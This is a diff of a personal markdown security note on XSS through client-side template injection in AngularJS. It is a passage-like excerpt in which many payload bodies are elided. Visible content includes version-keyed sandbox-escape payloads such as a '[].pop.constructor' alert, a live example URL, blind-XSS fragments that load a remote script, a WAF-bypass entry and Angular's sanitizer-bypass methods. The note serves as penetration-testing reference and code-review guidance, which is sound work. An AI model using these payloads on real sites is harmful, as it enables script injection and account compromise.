@@ -5,33 +5,23 @@ updated_date: 18/10/2022
 type: note
 ---
 
-#  XSS
-- **🏷️Tags** :  #10-2022 
+# XSS
+- **🏷️Tags** :  #10-2022 - #XSS #Security #AngularJS #ClientSideTemplateInjection #WebSecurity
 
 ## 📝 Notes
 # XSS in Angular and AngularJS
 
-  
-
 ## Client Side Template Injection
 
-  
 
 The following payloads are based on Client Side Template Injection.
 
-  
-
-### Stored/Reflected XSS - Simple alert in AngularJS
-
-  
+### Stored/Reflected XSS - Simple Alert in AngularJS
 
 > AngularJS as of version 1.6 have removed the sandbox altogether
 
-  
 
 AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
-
-  
 
 ```javascript
 
@@ -40,26 +30,19 @@ AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
 ```
 
   
-
+---
 AngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
-
-  
 
 ```javascript
 
 {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
 
 ```
-
-  
-
 Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
 
   
-
+---
 AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
-
-  
 
 ```javascript
 
@@ -72,10 +55,8 @@ AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887
 ```
 
   
-
+---
 AngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
-
-  
 
 ```javascript
 
@@ -110,10 +91,8 @@ $eval('a(b.c)');[].push.apply=a;
 ```
 
   
-
+---
 AngularJS 1.5.0 - 1.5.8
-
-  
 
 ```javascript
 
@@ -122,10 +101,8 @@ AngularJS 1.5.0 - 1.5.8
 ```
 
   
-
-AngularJS 1.4.0 - 1.4.9
-
-  
+---
+AngularJS 1.4.0 - 1.4.9  
 
 ```javascript
 
@@ -134,10 +111,8 @@ AngularJS 1.4.0 - 1.4.9
 ```
 
   
-
+---
 AngularJS 1.3.20
-
-  
 
 ```javascript
 
@@ -146,10 +121,8 @@ AngularJS 1.3.20
 ```
 
   
-
+---
 AngularJS 1.3.19
-
-  
 
 ```javascript
 
@@ -164,10 +137,8 @@ $eval('x=alert(1)//');
 ```
 
   
-
+---
 AngularJS 1.3.3 - 1.3.18
-
-  
 
 ```javascript
 
@@ -180,10 +151,8 @@ $eval('x=alert(1)//'); }}
 ```
 
   
-
+---
 AngularJS 1.3.1 - 1.3.2
-
-  
 
 ```javascript
 
@@ -200,10 +169,8 @@ $eval('x=alert(1)//');
 ```
 
   
-
+---
 AngularJS 1.3.0
-
-  
 
 ```javascript
 
@@ -238,10 +205,8 @@ AngularJS 1.3.0
 ```
 
   
-
+---
 AngularJS 1.2.24 - 1.2.29
-
-  
 
 ```javascript
 
@@ -250,10 +215,8 @@ AngularJS 1.2.24 - 1.2.29
 ```
 
   
-
+---
 AngularJS 1.2.19 - 1.2.23
-
-  
 
 ```javascript
 
@@ -262,10 +225,8 @@ AngularJS 1.2.19 - 1.2.23
 ```
 
   
-
+---
 AngularJS 1.2.6 - 1.2.18
-
-  
 
 ```javascript
 
@@ -274,10 +235,8 @@ AngularJS 1.2.6 - 1.2.18
 ```
 
   
-
+---
 AngularJS 1.2.2 - 1.2.5
-
-  
 
 ```javascript
 
@@ -286,10 +245,8 @@ AngularJS 1.2.2 - 1.2.5
 ```
 
   
-
+---
 AngularJS 1.2.0 - 1.2.1
-
-  
 
 ```javascript
 
@@ -298,10 +255,8 @@ AngularJS 1.2.0 - 1.2.1
 ```
 
   
-
+---
 AngularJS 1.0.1 - 1.1.5 and Vue JS
-
-  
 
 ```javascript
 
@@ -311,13 +266,9 @@ AngularJS 1.0.1 - 1.1.5 and Vue JS
 
   
 
-### Advanced bypassing XSS
-
-  
+### Advanced Bypassing XSS
 
 AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)
-
-  
 
 ```javascript
 
@@ -326,10 +277,8 @@ AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter
 ```
 
   
-
+---
 AngularJS (without `'` single and `"` double quotes and `constructor` string)
-
-  
 
 ```javascript
 
@@ -337,7 +286,7 @@ AngularJS (without `'` single and `"` double quotes and `constructor` string)
 
 ```
 
-  
+  ---
 
 ```javascript
 
@@ -345,7 +294,7 @@ AngularJS (without `'` single and `"` double quotes and `constructor` string)
 
 ```
 
-  
+  ---
 
 ```javascript
 
@@ -353,7 +302,7 @@ AngularJS (without `'` single and `"` double quotes and `constructor` string)
 
 ```
 
-  
+  ---
 
 ```javascript
 
@@ -361,11 +310,8 @@ AngularJS (without `'` single and `"` double quotes and `constructor` string)
 
 ```
 
-  
-
-AngularJS bypass Waf [Imperva]
-
-  
+  ---
+  AngularJS bypass Waf [Imperva]
 
 ```javascript
 
@@ -377,11 +323,7 @@ AngularJS bypass Waf [Imperva]
 
 ### Blind XSS
 
-  
-
 1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)
-
-  
 
 ```javascript
 
@@ -397,12 +339,9 @@ document.getElementsByTagName('body')[0].appendChild(_)")()
 
 ```
 
-  
-  
+---
 
 Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)
-
-  
 
 ```javascript
 
@@ -419,11 +358,9 @@ document.getElementsByTagName('body')[0].appendChild(_)")()
 ```
 
   
-
+---
 1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)
-
   
-
 ```javascript
 
 {{
@@ -441,10 +378,8 @@ document\\x2ebody\\x2eappendChild(_);`),"')
 ```
 
   
-
+---
 1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)
-
-  
 
 ```javascript
 
@@ -463,10 +398,8 @@ document.getElementsByTagName(\'body\')[0].appendChild(_)")')()
 ```
 
   
-
+---
 1.2.19 (FireFox) by Mathias Karlsson
-
-  
 
 ```javascript
 
@@ -485,10 +418,8 @@ document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.cons
 ```
 
   
-
+---
 1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)
-
-  
 
 ```javascript
 
@@ -509,10 +440,8 @@ document\\x2ebody\\x2eappendChild(_);`),"')
 ```
 
   
-
+---
 1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)
-
-  
 
 ```javascript
 
@@ -533,10 +462,8 @@ document\\x2ebody\\x2eappendChild(_);`),a')
 ```
 
   
-
+---
 1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)
-
-  
 
 ```javascript
 
@@ -553,10 +480,8 @@ _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
 ```
 
   
-
+---
 1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)
-
-  
 
 ```javascript
 
@@ -582,35 +507,19 @@ $eval('a(b.c)');[].push.apply=a;
 
 ```
 
-  
-
 ## Automatic Sanitization
-
-  
 
 > To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.
 
-  
-
 However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:
 
-  
-
 - bypassSecurityTrustHtml
-
 - bypassSecurityTrustScript
-
 - bypassSecurityTrustStyle
-
 - bypassSecurityTrustUrl
-
 - bypassSecurityTrustResourceUrl
 
-  
-
 Example of a component using the unsecure method `bypassSecurityTrustUrl`:
-
-  
 
 ```
 
@@ -658,11 +567,7 @@ this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
 
 When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.
 
-  
-
 ## References
-
-  
 
 - [XSS without HTML - CSTI with Angular JS - Portswigger](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
 
@@ -671,10 +576,7 @@ When doing a code review, you want to make sure that no user input is being trus
 - [Angular Security](https://angular.io/guide/security)
 
 - [Bypass DomSanitizer](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
-
-
 ## Questions/Thoughts
-
 
 ## 🔗 Links
 - 
